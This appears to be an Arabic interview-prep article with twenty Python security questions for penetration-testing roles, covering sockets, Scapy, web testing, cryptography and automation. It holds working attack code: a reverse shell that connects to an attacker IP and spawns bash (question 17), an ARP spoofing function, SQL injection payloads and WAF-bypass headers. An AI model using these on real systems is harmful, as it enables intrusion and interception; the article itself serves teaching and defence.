---
title: "Python للأمن السيبراني: أسئلة وأجوبة مقابلات لمختبري الاختراق"
description: "20 سؤال مقابلة في Python والأمان لأدوار اختبار الاختراق وأمن المعلومات. يغطي برمجة المقابس، Scapy، استغلال الويب، التشفير، وأتمتة البرمجة النصية."
date: 2026-02-11
tags: ["python", "interview", "security", "penetration-testing"]
keywords: ["python security interview", "infosec python questions", "scripting for hackers", "python pentest interview", "socket programming interview", "scapy interview questions", "python cryptography", "ethical hacking python", "security automation interview", "python exploit development"]
draft: false
schema_json: >
  {
    "@context": "https://schema.org",
    "@type": "TechArticle",
    "name": "Python للأمن السيبراني: أسئلة وأجوبة مقابلات لمختبري الاختراق",
    "description": "20 سؤال مقابلة في Python والأمان يغطي برمجة المقابس، معالجة الحزم، استغلال الويب، والأتمتة.",
    "proficiencyLevel": "Advanced",
    "inLanguage": "ar"
  }
---

## تهيئة النظام

Python هي اللغة المهيمنة في الأمن الهجومي والدفاعي. تتطلب أدوار اختبار الاختراق والفريق الأحمر ومحلل SOC وهندسة الأمان جميعها إتقان Python للأتمتة وتطوير الأدوات والنمذجة السريعة. يتوقع المحاورون منك كتابة الكود فورياً — من عملاء مقابس TCP إلى صانعي الحزم إلى نصوص استغلال الويب. يغطي هذا الدليل 20 سؤالاً تختبر تقاطع برمجة Python ومعرفة الأمان.

**هل تحتاج مقاطع كود جاهزة؟** أبقِ [ورقة غش البرمجة الأمنية بـ Python](/cheatsheets/python-security-scripts/) مفتوحة أثناء تحضيرك.

---

## الشبكات والمقابس

<details>
<summary><strong>1. كيف تنشئ عميل TCP في Python؟</strong></summary>
<br>

```python
import socket

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(("target.com", 80))
client.send(b"GET / HTTP/1.1\r\nHost: target.com\r\n\r\n")
response = client.recv(4096)
print(response.decode())
client.close()
```

النقاط الرئيسية: `AF_INET` = IPv4، `SOCK_STREAM` = TCP. لبروتوكول UDP، استخدم `SOCK_DGRAM` و`sendto()`/`recvfrom()` بدلاً من `connect()`/`send()`/`recv()`. احرص دائماً على تعيين المهلة الزمنية في نصوص الإنتاج: `client.settimeout(5)`.
</details>

<details>
<summary><strong>2. كيف يعمل المصافحة الثلاثية لـ TCP على مستوى المقبس؟</strong></summary>
<br>

عند استدعاء `client.connect((host, port))`، تُفعّل مكتبة مقابس Python نظام التشغيل لتنفيذ المصافحة الثلاثية:

1. يرسل نظام التشغيل حزمة **SYN** إلى الخادم.
2. يستجيب الخادم بـ **SYN-ACK**.
3. يرسل نظام التشغيل **ACK** — تم إنشاء الاتصال، يعود `connect()`.

إذا فشلت المصافحة (منفذ مغلق، انتهاء المهلة)، يُطلق `connect()` خطأ `ConnectionRefusedError` أو `socket.timeout`. مع Scapy، يمكنك صياغة وإرسال كل حزمة يدوياً لتنفيذ فحوصات SYN الخفية — إرسال SYN، التحقق من SYN-ACK، ثم إرسال RST بدلاً من ACK لتجنب إكمال المصافحة.
</details>

<details>
<summary><strong>3. اكتب ماسح منافذ متعدد الخيوط في Python.</strong></summary>
<br>

```python
import socket
import threading
from queue import Queue

target = "192.168.1.1"
open_ports = []
lock = threading.Lock()
queue = Queue()

def scan(port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        result = s.connect_ex((target, port))
        s.close()
        if result == 0:
            with lock:
                open_ports.append(port)
    except Exception:
        pass

def worker():
    while not queue.empty():
        scan(queue.get())
        queue.task_done()

for p in range(1, 1025):
    queue.put(p)

for _ in range(100):
    t = threading.Thread(target=worker, daemon=True)
    t.start()

queue.join()
print(f"Open ports: {sorted(open_ports)}")
```

نقاط النقاش: لماذا الخيوط وليس العمليات (مقيد بالإدخال/الإخراج، وليس بالمعالج)، لماذا `connect_ex` بدلاً من `connect` (يعيد رمز خطأ بدلاً من إطلاق استثناء)، ولماذا `settimeout` حاسم (يمنع التعليق على المنافذ المُفلترة).
</details>

<details>
<summary><strong>4. ما الفرق بين `socket.connect()` و`socket.connect_ex()`؟</strong></summary>
<br>

- `connect()`: يُطلق استثناء (`ConnectionRefusedError`، `TimeoutError`) إذا فشل الاتصال. مناسب للنصوص التي يجب أن يوقف فيها الفشل التنفيذ.
- `connect_ex()`: يعيد رمز خطأ بدلاً من إطلاق استثناء. يعيد `0` عند النجاح، errno غير صفري عند الفشل. أفضل لماسحات المنافذ حيث تحتاج للتحقق من مئات المنافذ دون عبء try/except.
</details>

## Scapy ومعالجة الحزم

<details>
<summary><strong>5. ما هو Scapy ولماذا يُفضّل على المقابس الخام؟</strong></summary>
<br>

Scapy هي مكتبة Python للتلاعب التفاعلي بالحزم. تتيح لك تزوير وإرسال والتقاط وتحليل حزم الشبكة في أي طبقة بروتوكول.

المزايا مقارنة بالمقابس الخام:
- **البناء طبقة بطبقة**: بناء الحزم عن طريق تكديس طبقات البروتوكول: `IP()/TCP()/Raw()`.
- **دعم البروتوكولات**: دعم مدمج لمئات البروتوكولات (ARP، DNS، ICMP، TCP، UDP، 802.11).
- **تحليل الاستجابات**: يطابق تلقائياً الطلبات مع الاستجابات ويحللها.
- **الوضع التفاعلي**: REPL لتجربة الحزم الحية.

تتطلب المقابس الخام بناء الحزم يدوياً على مستوى البايت وأذونات على مستوى نظام التشغيل. يجرّد Scapy هذا مع توفير نفس مستوى التحكم.
</details>

<details>
<summary><strong>6. كيف تنفذ انتحال ARP باستخدام Scapy؟</strong></summary>
<br>

```python
from scapy.all import ARP, Ether, sendp

def arp_spoof(target_ip, spoof_ip, target_mac):
    packet = Ether(dst=target_mac) / ARP(
        op=2,  # ARP reply
        pdst=target_ip,
        hwdst=target_mac,
        psrc=spoof_ip  # Claim to be this IP
    )
    sendp(packet, verbose=0)
```

يرسل هذا رد ARP غير مطلوب يُخبر الهدف أن `spoof_ip` موجود على عنوان MAC الخاص بك. يتم إعادة توجيه حركة المرور المخصصة لـ `spoof_ip` إلى جهازك. بالاقتران مع إعادة توجيه IP، يُمكّن هذا هجمات الرجل في المنتصف.

**الدفاع**: إدخالات ARP ثابتة، فحص ARP الديناميكي (DAI)، أو أدوات مراقبة ARP مثل arpwatch.
</details>

<details>
<summary><strong>7. كيف تلتقط حركة مرور الشبكة وتُفلتر بروتوكولات محددة؟</strong></summary>
<br>

```python
from scapy.all import sniff, TCP, IP

def packet_handler(packet):
    if packet.haslayer(TCP) and packet.haslayer(IP):
        src = packet[IP].src
        dst = packet[IP].dst
        sport = packet[TCP].sport
        dport = packet[TCP].dport
        print(f"{src}:{sport} -> {dst}:{dport}")

# Capture HTTP traffic only
sniff(filter="tcp port 80", prn=packet_handler, count=50, store=0)
```

يستخدم المعامل `filter` صيغة BPF (Berkeley Packet Filter). `store=0` يمنع الاحتفاظ بالحزم في الذاكرة. يتطلب صلاحيات root/admin.
</details>

## أمن الويب

<details>
<summary><strong>8. كيف تُؤتمت طلبات الويب لاختبار الأمان؟</strong></summary>
<br>

```python
import requests

session = requests.Session()

# Custom headers to bypass basic WAFs
session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "X-Forwarded-For": "127.0.0.1"
})

# Login and maintain session cookies
login_data = {"username": "admin", "password": "test"}
session.post("http://target.com/login", data=login_data)

# Authenticated request (cookies auto-included)
response = session.get("http://target.com/admin/dashboard")
print(response.status_code)
```

المفاهيم الرئيسية: `Session()` يحافظ على الكوكيز بين الطلبات. احرص دائماً على تعيين `timeout` في نصوص الإنتاج. استخدم `verify=False` فقط في بيئات الاختبار المُتحكم بها (يُعطّل التحقق من SSL).
</details>

<details>
<summary><strong>9. كيف تختبر حقن SQL باستخدام Python؟</strong></summary>
<br>

```python
import requests

url = "http://target.com/search"
payloads = [
    "' OR 1=1--",
    "' UNION SELECT NULL,NULL--",
    "'; WAITFOR DELAY '0:0:5'--",
    "' AND 1=CONVERT(int,@@version)--"
]

for payload in payloads:
    r = requests.get(url, params={"q": payload}, timeout=10)
    if "error" in r.text.lower() or "sql" in r.text.lower():
        print(f"[!] Possible SQLi with: {payload}")
    if r.elapsed.seconds >= 5:
        print(f"[!] Time-based SQLi confirmed: {payload}")
```

يختبر هذا حقن SQL القائم على الأخطاء (رسائل خطأ في الاستجابة)، القائم على UNION (مخرجات مُعدّلة)، والأعمى القائم على الوقت (استجابة متأخرة). للاختبارات المهنية، استخدم SQLMap — لكن المحاورين يتوقعون فهمك للآليات الأساسية.
</details>

<details>
<summary><strong>10. ما الفرق بين requests.get() وurllib؟</strong></summary>
<br>

- **requests**: مكتبة خارجية. واجهة برمجة نظيفة، تحليل JSON تلقائي، إدارة الجلسات، تجميع الاتصالات، دعم البروكسي. المعيار الصناعي لـ HTTP في Python.
- **urllib**: مكتبة قياسية. أكثر إسهاباً، منخفضة المستوى. بدون إدارة جلسات. مفيدة عندما لا يمكنك تثبيت حزم خارجية (بيئات مقيدة، دوال lambda).

لاختبار الأمان، يُفضّل `requests` لبساطته. لتطوير الثغرات حيث تقليل التبعيات مهم، قد يكون `urllib` أو حتى المقابس الخام أفضل.
</details>

## التشفير

<details>
<summary><strong>11. ما الفرق بين التجزئة والتشفير؟</strong></summary>
<br>

- **التجزئة**: دالة أحادية الاتجاه. مُدخل → ملخص بحجم ثابت. لا يمكن عكسه. نفس المُدخل ينتج دائماً نفس المُخرج. يُستخدم للتحقق من السلامة وتخزين كلمات المرور. أمثلة: SHA-256، bcrypt، Argon2.
- **التشفير**: دالة ثنائية الاتجاه. نص عادي → نص مُشفّر (بمفتاح) → نص عادي (بالمفتاح). مُصمم ليُعكس من قِبل حامل المفتاح. يُستخدم للسرية. أمثلة: AES، RSA، ChaCha20.

خطأ شائع: استخدام MD5/SHA لـ "تشفير" البيانات. التجزئة ليست تشفيراً — لا يمكنك استرداد البيانات الأصلية من تجزئة (بدون القوة الغاشمة).
</details>

<details>
<summary><strong>12. كيف تُطبّق تشفير AES في Python؟</strong></summary>
<br>

```python
from cryptography.fernet import Fernet

# Generate a key (store securely!)
key = Fernet.generate_key()
cipher = Fernet(key)

# Encrypt
plaintext = b"sensitive data"
ciphertext = cipher.encrypt(plaintext)

# Decrypt
decrypted = cipher.decrypt(ciphertext)
assert decrypted == plaintext
```

يستخدم Fernet تشفير AES-128-CBC مع HMAC-SHA256 للتشفير المُصادق عليه. للتحكم على مستوى أدنى، استخدم `cryptography.hazmat` مع AES-GCM (تشفير مُصادق عليه، لا حاجة لـ HMAC منفصل).

لا تُطبّق أبداً بدائل التشفير الخاصة بك. استخدم مكتبات راسخة.
</details>

<details>
<summary><strong>13. كيف تُجزّئ كلمات المرور بأمان في Python؟</strong></summary>
<br>

```python
import bcrypt

# Hash a password
password = b"user_password"
salt = bcrypt.gensalt(rounds=12)
hashed = bcrypt.hashpw(password, salt)

# Verify a password
if bcrypt.checkpw(password, hashed):
    print("Password matches")
```

لماذا bcrypt بدلاً من SHA-256: bcrypt **بطيء** عمداً (جولات قابلة للتكوين)، مما يجعل هجمات القوة الغاشمة غير عملية. صُمم SHA-256 ليكون سريعاً — يمكن للمهاجم حساب مليارات في الثانية باستخدام وحدات GPU. البدائل: Argon2 (مُكثّف للذاكرة، مُوصى به للمشاريع الجديدة)، PBKDF2 (مدعوم على نطاق واسع).
</details>

## الأتمتة والبرمجة النصية

<details>
<summary><strong>14. كيف تتعامل مع تنفيذ العمليات الفرعية بأمان في Python؟</strong></summary>
<br>

```python
import subprocess

# SECURE: Pass arguments as a list (no shell injection)
result = subprocess.run(
    ["nmap", "-sV", "-p", "80,443", "192.168.1.1"],
    capture_output=True, text=True, timeout=60
)
print(result.stdout)

# INSECURE: Never do this with user input
# subprocess.run(f"nmap {user_input}", shell=True)  # Command injection!
```

القواعد: لا تستخدم أبداً `shell=True` مع مُدخلات يتحكم بها المستخدم. مرّر الأوامر دائماً كقوائم. عيّن `timeout` لمنع التعليق. استخدم `capture_output=True` لجمع stdout/stderr.
</details>

<details>
<summary><strong>15. كيف تُحلل ملفات السجل باستخدام Python؟</strong></summary>
<br>

```python
import re
from collections import Counter

failed_logins = Counter()

with open("/var/log/auth.log") as f:
    for line in f:
        match = re.search(r"Failed password .* from (\d+\.\d+\.\d+\.\d+)", line)
        if match:
            failed_logins[match.group(1)] += 1

# Top 10 offending IPs
for ip, count in failed_logins.most_common(10):
    print(f"{ip}: {count} failed attempts")
```

للملفات الكبيرة، اقرأ دائماً سطراً بسطر (لا تستخدم `.read()` لتحميل الملف بالكامل في الذاكرة). استخدم `re.compile()` لترجمة أنماط التعبيرات النمطية مسبقاً لتحسين الأداء.
</details>

<details>
<summary><strong>16. ما هو GIL وكيف يؤثر على أدوات الأمان؟</strong></summary>
<br>

**قفل المُفسّر العام (GIL)** يمنع خيوطاً متعددة من تنفيذ كود Python البايتي في وقت واحد. يعمل خيط واحد فقط في كل مرة في CPython.

التأثير على أدوات الأمان:
- **ماسحات المنافذ** (مقيدة بالإدخال/الإخراج): تعمل الخيوط بشكل جيد. تقضي الخيوط معظم الوقت في انتظار استجابات الشبكة، وليس تنفيذ كود Python. يُحرّر GIL أثناء عمليات الإدخال/الإخراج.
- **كاسرات كلمات المرور** (مقيدة بالمعالج): الخيوط عديمة الجدوى. استخدم `multiprocessing` للاستفادة من أنوية المعالج المتعددة، أو استخدم امتدادات C (hashcat، John the Ripper) للكسر الفعلي.
- **البديل**: استخدم `asyncio` لأدوات الشبكة عالية التزامن (آلاف الاتصالات المتزامنة بأقل عبء).
</details>

## تطوير الثغرات

<details>
<summary><strong>17. كيف تصنع حمولة Shell عكسي في Python؟</strong></summary>
<br>

```python
import socket, subprocess, os

def reverse_shell(attacker_ip, attacker_port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((attacker_ip, attacker_port))
    os.dup2(s.fileno(), 0)  # stdin
    os.dup2(s.fileno(), 1)  # stdout
    os.dup2(s.fileno(), 2)  # stderr
    subprocess.call(["/bin/bash", "-i"])
```

يُعيد هذا توجيه stdin/stdout/stderr إلى مقبس TCP، مانحاً المهاجم Shell تفاعلي. في المقابلات، اشرح المفهوم والدفاع (تصفية الخروج، تجزئة الشبكة، مراقبة EDR) — وليس الكود فقط. هذا مُخصص للاختبار المُصرّح به وتحديات CTF فقط.
</details>

<details>
<summary><strong>18. ما هي التسلسل ولماذا تُشكّل خطراً أمنياً؟</strong></summary>
<br>

التسلسل يحوّل الكائنات إلى بايتات للتخزين/النقل. **إلغاء تسلسل** البيانات غير الموثوقة هو ثغرة حرجة.

```python
import pickle

# DANGEROUS: Never unpickle untrusted data
data = pickle.loads(untrusted_bytes)  # Can execute arbitrary code!
```

يمكن لوحدة `pickle` في Python تنفيذ كود عشوائي أثناء إلغاء التسلسل. يمكن للمهاجم صياغة حمولة pickle تُنشئ Shell عكسي عند تحميلها.

البدائل الآمنة: استخدم `json` لتبادل البيانات (لا يمكن تنفيذ كود). إذا كان يجب إلغاء تسلسل كائنات معقدة، استخدم التحقق بـ `jsonschema` أو protobuf/msgpack مع مخططات صارمة.
</details>

<details>
<summary><strong>19. كيف تتفاعل مع واجهات REST API لجمع OSINT؟</strong></summary>
<br>

```python
import requests

# Shodan API - find exposed services
api_key = "YOUR_API_KEY"
target = "8.8.8.8"
response = requests.get(
    f"https://api.shodan.io/shodan/host/{target}",
    params={"key": api_key}
)
data = response.json()

for service in data.get("data", []):
    print(f"Port {service['port']}: {service.get('product', 'unknown')}")
```

واجهات OSINT API الشائعة: Shodan (الأجهزة المكشوفة)، VirusTotal (تحليل البرمجيات الخبيثة)، Have I Been Pwned (بيانات الاختراقات)، SecurityTrails (سجل DNS). احترم دائماً حدود المعدل وشروط الخدمة.
</details>

<details>
<summary><strong>20. كيف تكتب راصد لوحة مفاتيح بـ Python وكيف تكتشف واحداً؟</strong></summary>
<br>

إجابة مفاهيمية (سياق المقابلة):
يتصل راصد لوحة المفاتيح بنظام إدخال نظام التشغيل لالتقاط ضربات المفاتيح. على Linux، يقرأ من أجهزة `/dev/input/event*`. على Windows، يستخدم واجهة `SetWindowsHookEx` عبر `ctypes` أو `pynput`.

**طرق الكشف**:
- مراقبة العمليات التي تصل إلى أجهزة الإدخال: `lsof /dev/input/*`.
- التحقق من استيرادات غير متوقعة لـ `pynput` أو `keyboard` أو `ctypes` في عمليات Python الجارية.
- توقيعات EDR/مضاد الفيروسات لأنماط راصد لوحة المفاتيح المعروفة.
- مراقبة الشبكة للكشف عن التسريب (يحتاج راصد لوحة المفاتيح لإرسال البيانات إلى مكان ما).

في المقابلات، أكّد دائماً على المنظور الدفاعي: كيفية اكتشاف ومنع والاستجابة لراصدي لوحة المفاتيح — وليس فقط كيفية بنائها.
</details>
